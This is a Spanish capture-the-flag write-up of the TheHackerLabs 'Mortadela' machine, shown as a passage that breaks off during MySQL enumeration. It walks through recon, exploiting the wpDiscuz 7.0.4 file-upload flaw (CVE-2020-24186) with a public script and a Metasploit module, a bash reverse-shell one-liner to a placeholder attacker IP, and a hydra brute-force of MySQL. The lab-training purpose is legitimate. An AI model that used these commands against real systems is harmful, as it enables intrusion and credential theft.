---
title: "Mortadela - TheHackerLabs"
date: 2025-01-30
draft: false
slug: "THL-writeup-mortadela"
excerpt: "Esta fue una máquina fácil, pero que requiere bastante talacha(trabajo) para resolverla. Descubrimos que tiene una página web activa en el puerto 80 y tiene expuesto el servicio MySQL en el puerto 3306. Analizando y aplicando Fuzzing a la página web, descubrimos que fue realizada con WordPress. Buscando plugins vulnerables, encontramos que usa el plugin wpDiscuz que es vulnerable al permitir subida de archivos, por lo que realizamos dos formas de explotar esta vulnerabilidad. Aparte, aplicamos fuerza bruta al servicio MySQL que nos permite loguearnos y enumerar el servicio, encontrando las credenciales de un usuario con el que nos podemos loguear al servicio SSH. Dentro, encontramos un archivo ZIP que tuvimos que crackear para encontrar su contraseña. El archivo ZIP contenía archivos de KeePass a los que les aplicamos un volcado de memoria para obtener la contraseña maestra, pues ahí se encuentra la contraseña del Root."
categories: ["TheHackerLabs", "Easy Machine"]
tags: ["Linux", "Apache", "WordPress", "Web Enumeration", "WordPress Enumeration", "Fuzzing", "Brute Force Attack", "Cracking Hash", "CVE-2020-24186 (Unauthenticated RCE)", "WordPress Plugin Vulnerability", "MySQL Enumeration", "BurpSuite", "System Recognition (Linux)", "Memory Dump (Volcado de Memoria)", "CVE-2023-32784 (Memory Dump)", "Privesc - CVE-2023-32784", "OSCP Style", "Metasploit Framework"]
tools:
  - "ping"
  - "nmap"
  - "wfuzz"
  - "gobuster"
  - "wappalizer"
  - "BurpSuite"
  - "wpscan"
  - "metasploit framework (msfconsole)"
  - "Módulo: auxiliary/scanner/http/wordpress_scanner"
  - "python3"
  - "searchsploit"
  - "bash"
  - "nc"
  - "Módulo: exploit/unix/webapp/wp_wpdiscuz_unauthenticated_file_upload"
  - "hydra"
  - "mysql"
  - "ssh"
  - "sudo"
  - "wget"
  - "linpeas.sh"
  - "scp"
  - "unzip"
  - "zip2john"
  - "JohnTheRipper"
  - "dotnet"
  - "crunch"
  - "keepass2john"
  - "KeePass"
links:
  - "https://www.exploit-db.com/exploits/49967"
  - "https://ine.com/blog/vulnerability-lab-wordpress-plugin-wpdiscuz-unauthenticated-rce?_x_tr_hist=true"
  - "https://stackoverflow.com/questions/78677369/mariadb-11-also-mysql-cli-error-2026-hy000-tls-ssl-error-ssl-is-required"
  - "https://github.com/peass-ng/PEASS-ng/releases/tag/20250126-41ed0f6a"
  - "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/wordpress.html?highlight=xmlrpc#xml-rpc"
  - "https://github.com/hev0x/CVE-2020-24186-wpDiscuz-7.0.4-RCE"
  - "https://roadtooscp.medium.com/exploiting-keepass-e0b5691f1409"
  - "https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/credential-harvesting/keepass"
  - "https://github.com/vdohney/keepass-password-dumper"
  - "https://www.cyberis.com/article/exploiting-keepass-cve-2023-32784"
  - "https://book.hacktricks.wiki/en/generic-hacking/brute-force.html?highlight=keepass#keepass"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-mortadela/Mortadela.jpg"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.1.60
PING 192.168.1.60 (192.168.1.60) 56(84) bytes of data.
64 bytes from 192.168.1.60: icmp_seq=1 ttl=64 time=1.82 ms
64 bytes from 192.168.1.60: icmp_seq=2 ttl=64 time=0.893 ms
64 bytes from 192.168.1.60: icmp_seq=3 ttl=64 time=0.914 ms
64 bytes from 192.168.1.60: icmp_seq=4 ttl=64 time=0.782 ms

--- 192.168.100.253 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3012ms
rtt min/avg/max/mdev = 0.782/1.101/1.818/0.416 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.60 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-29 15:02 CST
Initiating ARP Ping Scan at 15:02
Scanning 192.168.1.60 [1 port]
Completed ARP Ping Scan at 15:02, 0.08s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 15:02
Scanning 192.168.1.60 [65535 ports]
Discovered open port 22/tcp on 192.168.1.60
Discovered open port 3306/tcp on 192.168.1.60
Discovered open port 80/tcp on 192.168.1.60
Completed SYN Stealth Scan at 15:02, 7.08s elapsed (65535 total ports)
Nmap scan report for 192.168.1.60
Host is up, received arp-response (0.0010s latency).
Scanned at 2025-01-29 15:02:09 CST for 7s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
80/tcp   open  http    syn-ack ttl 64
3306/tcp open  mysql   syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 7.35 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Bastante curioso, estoy viendo que está abierto el **puerto 3306** que es del **servicio MySQL**, además, podemos ver que hay una página web activa en el **puerto 80**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80,3306 192.168.1.60 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-29 15:03 CST
Nmap scan report for 192.168.1.60
Host is up (0.00093s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)

| ssh-hostkey: 
|   256 aa:8d:e4:75:bc:f3:f8:5e:42:d0:ee:ca:e2:c4:0b:97 (ECDSA)
|_  256 ae:fd:91:ef:42:71:cb:11:b9:66:97:bf:ec:5b:d6:4b (ED25519)
80/tcp   open  http    Apache httpd 2.4.57 ((Debian))

|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: Apache2 Debian Default Page: It works
3306/tcp open  mysql   MariaDB 5.5.5-10.11.6

| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.11.6-MariaDB-0+deb12u1
|   Thread ID: 33
|   Capabilities flags: 63486
|   Some Capabilities: LongColumnFlag, SupportsLoadDataLocal, Support41Auth, Speaks41ProtocolOld, ConnectWithDatabase, SupportsTransactions, IgnoreSigpipes, InteractiveClient, ODBCClient, DontAllowDatabaseTableColumn, FoundRows, IgnoreSpaceBeforeParenthesis, SupportsCompression, Speaks41ProtocolNew, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: 2mQ.1Jb.[c_2y.t$OEH|
|_  Auth Plugin Name: mysql_native_password
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.06 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Vamos a empezar por revisar la página web y luego veremos si podemos hacer algo contra el **servicio MySQL** activo.

## Análisis de Vulnerabilidades {#Analisis}

### Fuzzing {#Fuzz}

Si analizaste bien el **escaneo de nmap**, nos damos cuenta de que la página web solo muestra la página por defecto de **Apache**.

Así que de una vez, vamos a aplicarle **Fuzzing** para ver si hay algo que no hemos visto.

```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://192.168.1.60/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.100.253/FUZZ
Total requests: 220545

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000573:   301        9 L      28 W       322 Ch      "wordpress"                                                                                                                  
000045226:   200        368 L    933 W      10701 Ch    "http://192.168.1.60/"                                                                                                    
000095510:   403        9 L      28 W       280 Ch      "server-status"                                                                                                              

Total time: 241.5021
Processed Requests: 220545
Filtered Requests: 220542
Requests/sec.: 913.2215
```

| Parámetros | Descripción |
|---|---|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |

Excelente, hemos encontrado un directorio que al parecer es de **WordPress**.

Vamos a aplicar **Fuzzing** a este directorio para ver que podemos encontrar.

Lo enfocaremos para que busque **archivos PHP y TXT**:
```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,php-txt http://192.168.1.60/wordpress/FUZZ.FUZ2Z
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.60/wordpress/FUZZ.FUZ2Z
Total requests: 441090

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000921:   200        119 L    503 W      7784 Ch     "wp-login - php"                                                                                                             
000000001:   301        0 L      0 W        0 Ch        "index - php"                                                                                                                
000009975:   200        4 L      13 W       136 Ch      "wp-trackback - php"                                                                                                         
000001330:   200        384 L    3177 W     19915 Ch    "license - txt"                                                                                                              
000034069:   405        0 L      6 W        42 Ch       "xmlrpc - php"                                                                                                               
000090451:   403        9 L      28 W       280 Ch      "php"                                                                                                                        
000092023:   302        0 L      0 W        0 Ch        "wp-signup - php"                                                                                                            

Total time: 453.5286
Processed Requests: 441090
Filtered Requests: 441083
Requests/sec.: 972.5736
```

| Parámetros | Descripción |
|---|---|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-z*	     | Para indicar una busqueda de archivos específicos. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://192.168.1.60/wordpress/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30 -x php,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.60/wordpress/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/wp-content           (Status: 301) [Size: 333] [--> http://192.168.1.60/wordpress/wp-content/]
/index.php            (Status: 301) [Size: 0] [--> http://192.168.1.60/wordpress/]
/wp-login.php         (Status: 200) [Size: 7793]
/license.txt          (Status: 200) [Size: 19915]
/wp-includes          (Status: 301) [Size: 334] [--> http://192.168.1.60/wordpress/wp-includes/]
/wp-trackback.php     (Status: 200) [Size: 136]
/wp-admin             (Status: 301) [Size: 331] [--> http://192.168.1.60/wordpress/wp-admin/]
Progress: 77557 / 661638 (11.72%)[ERROR] Get "http://192.168.1.60/wordpress/xmlrpc.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/.php                 (Status: 403) [Size: 280]
/wp-signup.php        (Status: 302) [Size: 0] [--> http://192.168.0.108/wordpress/wp-login.php?action=register]
Progress: 661635 / 661638 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-x*	     | Para indicar las extensiones de archivos especificas a buscar. |

Genial, hemos encontrado muchos directorios y archivos que podemos revisar, pero primero vamos a ver el primero que encontramos llamado **WordPress**.

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-mortadela/Captura1.png">
</p>

Parece una página simple.

Veamos que nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-mortadela/Captura2.png">
</p>

Bien, tenemos bastante información como la versión que están usando de **WordPress**, que está ocupando **MySQL y PHP**.

Si bajamos, encontramos una publicación que podemos intentar visitar, pero no se podrá ver nada ni aunque registres la IP que nos redirecciona en el `/etc/hosts` (esto en mi caso):

<p align="center">
<img src="/assets/images/THL-writeup-mortadela/Captura3.png">
</p>

La publicación fue realizada por un usuario llamado **mortadela**, así que vamos a guardarlo para más adelante.

De igual forma, podemos visitar una página de ejemplo que ofrecen, pero igual no se puede ver nada:

<p align="center">
<img src="/assets/images/THL-writeup-mortadela/Captura4.png">
</p>

No veo algo más por aquí, así que veamos si hay algo más en los directorios y archivos que encontramos.

#### Revisando Archivo wp-admin.php, wp-trackback.php y xmlrpc.php {#HTTP2}

Vamos a revisar primero el archivo `wp-admin.php`, que nos debería dar un login de **WordPress**:

<p align="center">
<img src="/assets/images/THL-writeup-mortadela/Captura5.png">
</p>

Tampoco lo puedo ver, parece que las redirecciones que se están haciendo no funcionan (en mi caso).

Ahora, veamos el archivo `wp-trackback.php`:

<p align="center">
<img src="/assets/images/THL-writeup-mortadela/Captura6.png">
</p>

Parece que podemos entrar, pero no veo que nos ayude mucho esto de momento.

Por último, revisemos el archivo `xmlrpc.php`:

<p align="center">
<img src="/assets/images/THL-writeup-mortadela/Captura7.png">
</p>

Tardo bastante, pero pudimos entrar. Podríamos tratar de aplicar fuerza bruta, pero parece que la conexión no es estable, porque cada recarga es muy tardada, por lo que no lo veo óptimo de realizar.

#### Revisando Archivo wp-login.php {#HTTP3}

Entremos a este archivo:

<p align="center">
<img src="/assets/images/THL-writeup-mortadela/Captura8.png">
</p>

Como la mayoría, tardo bastante en entrar.

Vamos a capturar una petición de inicio de sesión con **BurpSuite** con un correo y contraseña de prueba, y luego vamos a mandarlo al **Repeater**:

<p align="center">
<img src="/assets/images/THL-writeup-mortadela/Captura9.png">
</p>

Pero, al momento de ejecutar la petición, no tendremos respuesta e incluso si mandamos la petición por el **Repeater**, nos reportará que no se pudo conectar:

<p align="center">
<img src="/assets/images/THL-writeup-mortadela/Captura10.png">
</p>

Por ahora, vamos a buscar si existe un plugin que sea vulnerable.

### Buscando Plugins Vulnerables de Aplicación Web con wpscan y Módulo de Metasploit {#WPSCAN}

Vamos a buscar plugins vulnerables con **wpscan**:
```bash
wpscan --url http://192.168.1.60/wordpress/ --enumerate u,vp --plugins-detection aggressive
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.1.60/wordpress/ [192.168.1.60]
[+] Started: Thu Jan 30 13:46:37 2025

Interesting Finding(s):

[+] Headers

 | Interesting Entry: Server: Apache/2.4.57 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.1.60/wordpress/xmlrpc.php

 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.100.253/wordpress/readme.html

 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.1.60/wordpress/wp-content/uploads/

 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.1.60/wordpress/wp-cron.php

 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.7.1 identified (Latest, released on 2024-11-21).

 | Found By: Emoji Settings (Passive Detection)
 |  - http://192.168.1.60/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=6.7.1'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://192.168.1.60/wordpress/, Match: 'WordPress 6.7.1'

[i] The main theme could not be detected.

[+] Enumerating Vulnerable Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:00:07 <============================================================================================================> (7343 / 7343) 100.00% Time: 00:00:07
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] No plugins Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] mortadela

 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu Jan 30 13:47:18 2025
[+] Requests Done: 7396
[+] Cached Requests: 4
[+] Data Sent: 2.161 MB
[+] Data Received: 1.375 MB
[+] Memory used: 228.961 MB
[+] Elapsed time: 00:00:41
```

| Parámetros | Descripción |
|---|---|
| *--url*    | Para indicar la URL a escanear. |
| *--enumerate* | Indicando que aplique enumeración, puede ser de usuarios (`u`), de plugins vulnerables (`vp`), etc. |
| *--plugins-detection* | Para indicar un modo de detección de plugins, se puede elegir entre `passive` (pasivo), `mixed` (mixto) y `agressive` (agresivo). |

No encontró un plugin que podamos explotar, pero si encontró la ruta de carga de archivo que puedes visitar.

Vamos a usar un módulo de **Metasploit** para comprobar que no hay un plugin vulnerable.

Configuramos el módulo `auxiliary/scanner/http/wordpress_scanner`:
```bash
msf6 > use auxiliary/scanner/http/wordpress_scanner
msf6 auxiliary(scanner/http/wordpress_scanner) > set RHOSTS 192.168.1.60
RHOSTS => 192.168.1.60
msf6 auxiliary(scanner/http/wordpress_scanner) > set TARGETURI /wordpress
TARGETURI => /wordpress
```

Y lo ejecutamos:
```bash
msf6 auxiliary(scanner/http/wordpress_scanner) > exploit
[*] Trying 192.168.1.60
[+] 192.168.1.60 - Detected Wordpress 6.7.1
[*] 192.168.1.60 - Enumerating Themes
[*] 192.168.1.60 - Progress  0/3 (0.0%)
[*] 192.168.1.60 - Finished scanning themes
[*] 192.168.1.60 - Enumerating plugins
[*] 192.168.1.60 - Progress   0/70 (0.0%)
[+] 192.168.1.60 - Detected plugin: wpdiscuz version 7.0.4
[*] 192.168.1.60 - Finished scanning plugins
[*] 192.168.1.60 - Searching Users
[*] 192.168.1.60 - Was not able to identify users on site using /wordpress/wp-json/wp/v2/users
[*] 192.168.1.60 - Finished all scans
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
Parece que ahora sí encontramos un plugin vulnerable que es `wpdiscuz version 7.0.4`, además ha identificado una versión distinta de **WordPress** a la que nos reportó **Wappalizer**.

Si buscamos el plugin con **searchsploit**, encontraremos 3 versiones que podemos usar:
```bash
searchsploit wpdiscuz
------------------------------------------------------------------------------------------------------------------------------------------------------------ ------------------------------
 Exploit Title                                                                                                                                              |  Path

|---|---|
Wordpress Plugin wpDiscuz 7.0.4 - Arbitrary File Upload (Unauthenticated)                                                                                   | php/webapps/49962.sh
WordPress Plugin wpDiscuz 7.0.4 - Remote Code Execution (Unauthenticated)                                                                                   | php/webapps/49967.py
Wordpress Plugin wpDiscuz 7.0.4 - Unauthenticated Arbitrary File Upload (Metasploit)                                                                        | php/webapps/49401.rb

|---|---|
Shellcodes: No Results
```
Procedamos a explotar el plugin.

## Explotación de Vulnerabilidades {#Explotacion}

### Probando Exploit: WordPress Plugin wpDiscuz 7.0.4 - Remote Code Execution (Unauthenticated) versión Python {#Exploit1}

Investigando la vulnerabilidad, me encontré con este blog de **INE Security**, en donde realizaron un laboratorio que explota esta vulnerabilidad:
* <a href="https://ine.com/blog/vulnerability-lab-wordpress-plugin-wpdiscuz-unauthenticated-rce?_x_tr_hist=true" target="_blank">INE Security - Vulnerability Lab: WordPress Plugin wpDiscuz Unauthenticated RCE</a>

Como ya tenemos el Exploit dentro de Kali, solamente vamos a copiarlo en nuestro directorio de trabajo.

Copiamos este Exploit con **searchsploit**:
```bash
searchsploit -m php/webapps/49967.py
  Exploit: WordPress Plugin wpDiscuz 7.0.4 - Remote Code Execution (Unauthenticated)
      URL: https://www.exploit-db.com/exploits/49967
     Path: /usr/share/exploitdb/exploits/php/webapps/49967.py
    Codes: CVE-2020-24186
 Verified: False
File Type: Python script, Unicode text, UTF-8 text executable, with very long lines (864)
```
Si analizamos el Exploit, resulta que se aprovecha de una vulnerabilidad que permite subida de archivos gracias al **plugin wpDiscuz 7.0.4**, pero lo que sube es una webshell de **PHP**.

Una vez que se sube la webshell, permite la ejecución de comandos desde el Exploit.

Vamos a ejecutarlo para saber como usarlo:
```bash
python3 49967.py
[+] Specify an url target
[+] Example usage: exploit.py -u http://192.168.1.81/blog -p /wordpress/2021/06/blogpost
[+] Example help usage: exploit.py -h
```
Bien, parece que tenemos que indicarle la URL que da al **WordPress** y un blog que se haya publicado. 

Ya tenemos ambos, así que vamos a indicárselo al Exploit y ejecutémoslo:
```bash
python3 49967.py -u http://192.168.1.60/wordpress -p /index.php/2024/04/01/hola-mundo/
---------------------------------------------------------------
[-] Wordpress Plugin wpDiscuz 7.0.4 - Remote Code Execution
[-] File Upload Bypass Vulnerability - PHP Webshell Upload
[-] CVE: CVE-2020-24186
[-] https://github.com/hevox
--------------------------------------------------------------- 

[+] Response length:[92493] | code:[200]
[!] Got wmuSecurity value: 80451a84a9
[!] Got wmuSecurity value: 1 

[+] Generating random name for Webshell...
[!] Generated webshell name: qgrhpewgyyqgxfy

[!] Trying to Upload Webshell..
[+] Upload Success... Webshell path:url&quot;:&quot;http://192.168.0.108/wordpress/wp-content/uploads/2025/01/qgrhpewgyyqgxfy-1738273086.5845.php&quot; 

>
```
Muy bien, funciono y parece que ya podemos ejecutar comandos.

O eso pensaba porque cuando ejecute uno, se genera un fallo y se cierra el Exploit:
```bash
[+] Generating random name for Webshell...
[!] Generated webshell name: qgrhpewgyyqgxfy

[!] Trying to Upload Webshell..
[+] Upload Success... Webshell path:url&quot;:&quot;http://192.168.0.108/wordpress/wp-content/uploads/2025/01/qgrhpewgyyqgxfy-1738273086.5845.php&quot; 

> id

[x] Failed to execute PHP code...
```
Podríamos decir que fallo, pero recuerda que se subió una **webshell de PHP** al **WordPress** y nos indica la ruta donde se subió.

Vamos a visitarla:

<p align="center">
<img src="/assets/images/THL-writeup-mortadela/Captura11.png">
</p>

Ahí está, la identificamos por el nombre que le asigno el Exploit que nos mostró en su ejecución.

Nada más entramos en ella y le indicamos que ejecute un comando:

<p align="center">
<img src="/assets/images/THL-writeup-mortadela/Captura12.png">
</p>

Funciona.

Tan solo hay que usar nuestra **Reverse Shell** de bash y solo URL encodeamos el ampersand:
```bash
bash -c 'bash -i >%26 /dev/tcp/Tu_IP/443 0>%261'
```

Ahora abre una **netcat** y luego ejecuta el comando, con eso deberías obtener una sesión de la máquina víctima:
```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.1.60] 45378
bash: cannot set terminal process group (557): Inappropriate ioctl for device
bash: no job control in this shell
www-data@mortadela:/var/www/html/wordpress/wp-content/uploads/2025/01$ whoami
whoami
www-data
```
Bien, obtuvimos acceso a la máquina.

### Probando Módulo de Metasploit: exploit/unix/webapp/wp_wpdiscuz_unauthenticated_file_upload {#Exploit2}

Esa misma vulnerabilidad, la podemos encontrar como un módulo de **Metasploit**, que igual ocuparon en el laboratorio de **INE Security**.

Como ya tenemos una sesión iniciada, solamente tenemos que usar ese módulo y configurarlo.

Vamos a buscarlo primero:

```bash
msf6 auxiliary(scanner/http/wordpress_scanner) > search wpdiscuz

Matching Modules
================

   #  Name                                                         Disclosure Date  Rank       Check  Description
   -  ----                                                         ---------------  ----       -----  -----------
   0  exploit/unix/webapp/wp_wpdiscuz_unauthenticated_file_upload  2020-02-21       excellent  Yes    WordPress wpDiscuz Unauthenticated File Upload Vulnerability

Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/wp_wpdiscuz_unauthenticated_file_upload
```

Lo configuramos:
```bash
msf6 auxiliary(scanner/http/wordpress_scanner) > use exploit/unix/webapp/wp_wpdiscuz_unauthenticated_file_upload
[*] Using configured payload php/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/wp_wpdiscuz_unauthenticated_file_upload) > set LHOST Tu_IP
LHOST => Tu_IP
msf6 exploit(unix/webapp/wp_wpdiscuz_unauthenticated_file_upload) > set RHOSTS 192.168.1.60
RHOSTS => 192.168.1.60
msf6 exploit(unix/webapp/wp_wpdiscuz_unauthenticated_file_upload) > set TARGETURI /wordpress
TARGETURI => /wordpress
msf6 exploit(unix/webapp/wp_wpdiscuz_unauthenticated_file_upload) > set BLOGPATH /index.php/2024/04/01/hola-mundo/
BLOGPATH => /index.php/2024/04/01/hola-mundo/
```

Y lo ejecutamos:
```bash
msf6 exploit(unix/webapp/wp_wpdiscuz_unauthenticated_file_upload) > exploit
[*] Started reverse TCP handler on Tu_IP:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[+] Payload uploaded as zAVVNkzASqw.php
[*] Calling payload...
[*] Sending stage (40004 bytes) to 192.168.1.60
[*] Meterpreter session 1 opened (Tu_IP:4444 -> 192.168.1.60:57386) at 2025-01-30 15:30:16 -0600
[!] This exploit may require manual cleanup of 'zAVVNkzASqw.php' on the target
.
meterpreter > getuid
Server username: www-data
```
Muy bien, obtuvimos una sesión de **Meterpreter**.

### Aplicando Fuerza Bruta y Enumeración al Servicio MySQL {#MySQL}

Si recordamos, habíamos visto que está activo el **servicio MySQL** y se encuentra expuesto.

De igual forma, ya tenemos un usuario llamado **mortadela**, pero no va a funcionar este usuario para aplicarle fuerza bruta.

Entonces, vamos a tratar de encontrar la contraseña del **usuario root**, que es el usuario común dentro del **servicio MySQL**:
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.60 mysql
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-30 13:55:54
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking mysql://192.168.1.60:3306/
[3306][mysql] host: 192.168.1.60   login: root   password: cassandra
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-30 13:56:18
```
Excelente, encontramos la contraseña.

Al intentar loguearnos, debemos indicar que se salte el uso de **certificado SSL**:
```bash
mysql -uroot -p -h 192.168.1.60 --skip-ssl
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 2070
Server version: 10.11.6-MariaDB-0+deb12u1 Debian 12

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Support MariaDB developers by giving a star at https://github.com/MariaDB/server
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```
Estamos dentro.

Veamos que bases de datos existen:
```bash
MariaDB [(none)]> show databases;
+--------------------+

| Database           |
+--------------------+

| confidencial       |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| wordpress          |
+--------------------+
6 rows in set (0.005 sec)
```
Muy curiosa esa BD que se llama **confidencial**.

Usemos esa BD y veamos sus tablas:
```bash
